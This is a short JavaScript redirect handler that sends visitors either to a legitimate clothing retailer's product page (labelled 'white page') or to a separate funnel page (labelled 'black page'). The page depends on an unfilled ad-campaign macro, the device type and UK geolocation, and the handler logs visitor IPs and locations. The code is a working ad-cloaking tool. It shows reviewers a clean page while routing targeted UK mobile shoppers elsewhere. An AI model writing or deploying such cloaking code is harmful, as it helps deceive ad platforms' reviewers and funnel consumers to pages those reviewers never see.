import geoip from 'geoip-lite';

export default function handler(req, res) {
  // URLs to redirect
  const whitePageURL = "https://outfitters.com.pk/collections/men-t-shirts/products/f1449-106?variant=43923076350143";
  const blackPageURL = "https://jahzuipqiksuasdkzw.myfunnelish.com/chelsea-boden-boots-1737635084899211";

  // Parse the UTM parameters from the request URL
  const queryParams = new URLSearchParams(req.url.split('?')[1]);
  const utmCampaign = queryParams.get('utm_campaign');

  // Get the User-Agent from the request headers
  const userAgent = req.headers['user-agent'] || '';
  const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  // Get the user's IP address from Vercel's headers
  const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || '0.0.0.0';

  // Lookup IP to get geolocation
  const geo = geoip.lookup(ip);

  const isFromUK = geo && geo.country === 'GB'; // Check if the user is from the UK
console.log('User IP:', ip);
console.log('Geo Info:', geo);
  // Redirection logic
  if (utmCampaign === '__AID_NAME__') {
    // UTM campaign 'l1' takes priority for both desktop and mobile
    res.writeHead(302, { Location: whitePageURL });
  } else if (isMobileDevice && isFromUK) {
    // Mobile devices from the UK
    res.writeHead(302, { Location: blackPageURL });
  } else {
    // All other devices and locations
    res.writeHead(302, { Location: whitePageURL });
  }

  res.end();
}
